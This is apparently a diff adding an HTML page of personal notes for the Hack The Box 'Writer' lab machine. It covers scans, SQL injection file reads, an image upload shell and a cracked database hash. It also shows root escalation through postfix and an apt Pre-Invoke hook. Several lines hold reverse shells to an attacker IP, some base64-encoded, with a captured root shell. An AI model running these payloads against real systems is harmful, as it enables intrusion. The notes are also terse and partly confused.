@@ -1,0 +1,79 @@
+
+		<head>
+			<style type="text/css" media="screen">
+				body,html{font-family:var(--markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", system-ui, "Ubuntu", "Droid Sans", sans-serif);font-size:var(--markdown-font-size,14px);padding:0 26px;line-height:var(--markdown-line-height,22px);word-wrap:break-word}body{padding-top:1em}h1,h2,h3,h4,h5,h6,ol,p,pre,ul{margin-top:0}h2,h3,h4,h5,h6{font-weight:400;margin-bottom:.2em}img{max-width:100%;max-height:100%}a{text-decoration:none}a:hover{text-decoration:underline}a:focus,input:focus,select:focus,textarea:focus{outline:1px solid -webkit-focus-ring-color;outline-offset:-1px}p{margin-bottom:.7em}ol,ul{margin-bottom:.7em}hr{border:0;height:2px;border-bottom:2px solid}h1{padding-bottom:.3em;line-height:1.2;border-bottom-width:1px;border-bottom-style:solid;font-weight:400}table{border-collapse:collapse}th{text-align:left;border-bottom:1px solid}td,th{padding:5px 10px}table>tbody>tr+tr>td{border-top:1px solid}blockquote{margin:0 7px 0 5px;padding:0 16px 0 10px;border-left-width:5px;border-left-style:solid}code{font-family:var(--vscode-editor-font-family, "SF Mono", Monaco, Menlo, Consolas, "Ubuntu Mono", "Liberation Mono", "DejaVu Sans Mono", "Courier New", monospace);font-size:1em;line-height:1.357em}body.wordWrap pre{white-space:pre-wrap}pre.hljs code>div,pre:not(.hljs){padding:16px;border-radius:3px;overflow:auto}pre code{color:var(--vscode-editor-foreground);tab-size:4}
+			</style>
+		</head>
+		<body>
+			<p><img src="PWND/Writer.png" alt="image"></p>
+<p>#Masscan:</p>
+<p>Discovered open port 80/tcp on 10.10.11.101<br>Discovered open port 139/tcp on 10.10.11.101<br>Discovered open port 445/tcp on 10.10.11.101<br>Discovered open port 22/tcp on 10.10.11.101</p>
+<p>#Simple nmap scan:</p>
+<p>22/tcp  open  ssh
+80/tcp  open  http
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds</p>
+<p>#Directory Bruteforcing:</p>
+<p>ffuf -u <a href="http://10.10.11.101/FUZZ">http://10.10.11.101/FUZZ</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fw 1062 -c</p>
+<pre><code>administrative          [Status: 200, Size: 1443, Words: 185, Lines: 35]
+</code></pre>
+<p>/var/www/writer.htb/writer/<strong>init</strong>.py</p>
+<p>/etc/apache2/sites-enabled/000-default.conf</p>
+<p>Testing Sqlmap
+sqlmap -r res.txt --file-read=/etc/apache2/sites-enabled/000-default.conf</p>
+<p>we get an admin panel: 
+lets try injections sql.</p>
+<p>02_Spawning_TTY_Shell/////Rev_Shell
+use the jpg shell and boom! we have a shell! change <ip> and <port></p>
+<p>/var/www/writer2_project/writerv2/settings.py</p>
+<p>DATABASES = {
+    &#39;default&#39;: {
+        &#39;ENGINE&#39;: &#39;django.db.backends.mysql&#39;,
+        &#39;OPTIONS&#39;: {
+            &#39;read_default_file&#39;: &#39;/etc/mysql/my.cnf&#39;,</p>
+<p>www-data@writer:/var/www/writer2_project/writerv2$ cat /etc/mysql/my.cnf</p>
+<p>[client]
+database = dev
+user = djangouser
+password = DjangoSuperPassword
+default-character-set = utf8</p>
+<p>First Upgrade Shell# 
+python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</p>
+<p>#connect to DB
+mysql -u djangouser -P 3306 -p</p>
+<p>select * from auth_user</p>
+<p>pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=  | kyle   </p>
+<p>hashcat -a0 -m 10000 kyle_hash  /usr/share/wordlists/rockyou.txt </p>
+<p>password:marcoantonio</p>
+<p>kyle@writer:/home/john$ id 
+uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)</p>
+<p>find / -group filter -type f 2&gt;/dev/null
+/etc/postfix/disclaimer</p>
+<p>lets test smb
+netstat -ant : port 25 smb
+tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN </p>
+<p>lets use NATBypass Found in /opt DID NOT WORK*</p>
+<p>copy this rev shell. for #.sh</p>
+<p>echo L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjIxNi8xMzMzNyAwPiYxJwo= |base64 -d| bash</p>
+<p>imiditly after use port25_sendMailLocal.py found in ~/Desktop/scripts to catch a rev shell on port 13337</p>
+<p>once we have a shell go to /home/john and get his .ssh 
+cp it over chmod 600 and now you can ssh -i john_id <a href="mailto:&#106;&#x6f;&#104;&#x6e;&#64;&#119;&#114;&#x69;&#x74;&#101;&#114;&#46;&#104;&#116;&#x62;">&#106;&#x6f;&#104;&#x6e;&#64;&#119;&#114;&#x69;&#x74;&#101;&#114;&#46;&#104;&#116;&#x62;</a></p>
+<p>after checking the groups i noticed management</p>
+<p>john@writer:~$ find / -group management  2&gt;/dev/null
+/etc/apt/apt.conf.d</p>
+<p>looking at gtfo bins </p>
+<p><a href="https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/">https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/</a></p>
+<p>found an article to get root access with atp 3 ways apperatly. </p>
+<p>echo &#39;apt::Update::Pre-Invoke {“rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc KALI_IP 1234 &gt;/tmp/f”};’ &gt; pwn</p>
+<p>echo &#39;apt::Update::Pre-Invoke {&quot;echo <bash-cShell>| base64 -d | bash&quot;};&#39;&gt; pwn</p>
+<p>echo &#39;apt::Update::Pre-Invoke {&quot;echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjE2LzEzMzM3IDA+JjEiCg== | base64 -d | bash&quot;};&#39;&gt; test</p>
+<p>bob@kali:~/Desktop/Ethical_Hacking/writer$ nc -nlvp 13337
+listening on [any] 13337 ...
+connect to [10.10.14.216] from (UNKNOWN) [10.10.11.101] 38440
+bash: cannot set terminal process group (48065): Inappropriate ioctl for device
+bash: no job control in this shell
+root@writer:/tmp# </p>
+<p>boom!!!!</p>
+<p><img src="" alt="image"></p>
+
+		</body>
